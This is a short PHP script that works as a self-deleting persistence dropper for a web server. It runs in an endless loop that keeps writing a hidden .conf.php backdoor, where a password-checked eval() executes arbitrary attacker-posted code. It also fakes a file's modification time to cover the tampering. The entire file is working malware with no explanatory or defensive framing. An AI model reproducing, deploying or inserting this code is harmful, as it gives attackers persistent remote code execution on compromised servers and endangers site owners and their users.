<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = "./.conf.php";
$code = "<?php if(md5(\$_POST['pass'])=='88684c18e790d8427b473e80d5ef3041'){@eval(\$_POST[a]);}?>";
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .2.php');
    usleep(5000);
} 
?>